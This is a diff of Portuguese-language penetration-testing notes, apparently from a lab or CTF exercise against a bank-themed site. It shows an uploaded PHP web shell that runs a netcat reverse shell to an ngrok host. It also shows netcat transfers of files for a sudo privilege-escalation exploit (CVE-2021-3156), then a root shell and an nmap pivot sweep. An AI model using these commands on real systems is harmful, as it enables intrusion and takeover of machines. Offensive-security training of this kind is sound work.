@@ -136,7 +136,7 @@ porta: 14328
 
 Depois no url:
 www.bancocn.com/admin/uploads/shell.php7?cmd=nc [URL] [PORTA] -e /bin/bash
-www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 17041 -e /bin/bash
+www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 18114 -e /bin/bash
 
 ### Fazendo Reverse Python
 
@@ -263,23 +263,23 @@ https://github.com/CptGibbon/CVE-2021-3156
 
 // roda no ngronk
 
-nc -lvp 789 < exploit.c
+nc -lvp 789 < hax.c
 
 // na maquina do bob
 
-nc 0.tcp.sa.ngrok.io 17041 > exploit.c
+nc 0.tcp.sa.ngrok.io 18114 > hax.c
 
 // roda no ngronk novamente
 
-nc -lvp 789 < sheelcode.c
+nc -lvp 789 < lib.c
 
-nc 0.tcp.sa.ngrok.io 17041 > sheelcode.c
+nc 0.tcp.sa.ngrok.io 18114 > lib.c
 
 // roda no ngronk novamente
 
 nc -lvp 789 < Makefile
 
-nc 0.tcp.sa.ngrok.io 17041 > Makefile
+nc 0.tcp.sa.ngrok.io 18114 > Makefile
 
 // roda o executável
 
@@ -293,12 +293,19 @@ make
 
 whoiam - mostra o usuário
 
-### Mudando variáveis de ambiente
+// agora podemos rodar comandos como root
+
+## Pivoting
+
+### Instalação necessário
 
 export PATH=$PATH:/usr/bin
 
-// agora podemos rodar comandos como root
+EXPORT TERM=linux
 
 apt install nmap
 
-## 
+### Usando o nmap
+
+nmap 10.20.20.0/24 -sn
+
